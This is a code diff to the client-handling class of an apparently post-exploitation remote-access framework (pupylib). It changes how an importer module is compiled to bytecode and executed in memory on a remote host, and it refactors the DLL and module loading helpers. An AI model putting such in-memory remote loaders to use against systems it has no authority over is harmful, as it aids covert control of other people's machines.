@@ -24,6 +24,7 @@ from .PupyJob import PupyJob
 import imp
 import platform
 
+from pupylib.PupyCompile import pupycompile
 from pupylib.payloads import dependencies
 from pupylib.utils.rpyc_utils import obtain
 
@@ -39,9 +40,9 @@ class PupyClient(object):
         self.imported_modules = set()
         self.cached_modules = set()
         self.pupyimporter = None
-        self.has_load_dll = False
-        self.has_new_dlls = False
-        self.has_new_modules = False
+        self.load_dll = False
+        self.new_dlls = False
+        self.new_modules = False
         self.load_pupyimporter()
 
         #to reuse impersonated handle in other modules
@@ -182,24 +183,17 @@ class PupyClient(object):
 
     def load_pupyimporter(self):
         """ load pupyimporter in case it is not """
-        if "pupyimporter" not in self.conn.modules.sys.modules:
-            pupyimporter_code=""
-            with open(os.path.join(ROOT, "packages","all","pupyimporter.py"),'rb') as f:
-                pupyimporter_code=f.read()
-            self.conn.execute(textwrap.dedent(
-            """
-            import imp
-            import sys
-            def pupyimporter_preimporter(code):
-                mod = imp.new_module("pupyimporter")
-                mod.__name__="pupyimporter"
-                mod.__file__="<memimport>\\\\pupyimporter"
-                mod.__package__="pupyimporter"
-                sys.modules["pupyimporter"]=mod
-                exec code+"\\n" in mod.__dict__
-                mod.install()
-                """))
-            self.conn.namespace["pupyimporter_preimporter"](pupyimporter_code)
+        if not self.conn.modules.sys.modules.has_key('pupyimporter'):
+            self.conn.execute('\n'.join([
+                'import imp, sys, marshal',
+                'mod = imp.new_module("pupyimporter")',
+                'mod.__file__="<bootloader>/pupyimporter"',
+                'exec marshal.loads({}) in mod.__dict__'.format(
+                    repr(pupycompile(
+                        os.path.join(ROOT, 'packages', 'all', 'pupyimporter.py'),
+                        'pupyimporter.py', path=True, raw=True))),
+                'sys.modules["pupyimporter"]=mod',
+                'mod.install()']))
 
         self.pupyimporter = self.conn.modules.pupyimporter
 
@@ -215,9 +209,9 @@ class PupyClient(object):
         except:
             pass
 
-        self.has_load_dll = hasattr(self.pupyimporter, 'load_dll')
-        self.has_new_dlls = hasattr(self.pupyimporter, 'new_dlls')
-        self.has_new_modules = hasattr(self.pupyimporter, 'new_modules')
+        self.load_dll = getattr(self.pupyimporter, 'load_dll', None)
+        self.new_dlls = getattr(self.pupyimporter, 'new_dlls', None)
+        self.new_modules = getattr(self.pupyimporter, 'new_modules', None)
 
         self.imported_modules = set(obtain(self.conn.modules.sys.modules.keys()))
         self.cached_modules = set(obtain(self.pupyimporter.modules.keys()))
@@ -235,8 +229,8 @@ class PupyClient(object):
         if not buf:
             raise ImportError('Shared object {} not found'.format(name))
 
-        if has_load_dll:
-            result = pupyimporter.load_dll(name, buf)
+        if self.load_dll:
+            result = self.load_dll(name, buf)
         else:
             result = self.conn.modules.pupy.load_dll(name, buf)
 
@@ -270,15 +264,15 @@ class PupyClient(object):
             return modules
 
         if dll:
-            if self.has_new_dlls:
-                return self.pupyimporter.new_dlls(modules)
+            if self.new_dlls:
+                return self.new_dlls(modules)
             else:
                 return [
                     module for module in modules if not module in self.imported_dlls
                 ]
         else:
-            if self.has_new_modules :
-                new_modules = self.pupyimporter.new_modules(modules)
+            if self.new_modules :
+                new_modules = self.new_modules(modules)
             else:
                 new_modules = [
                     module for module in modules if not self.pupyimporter.has_module(module)
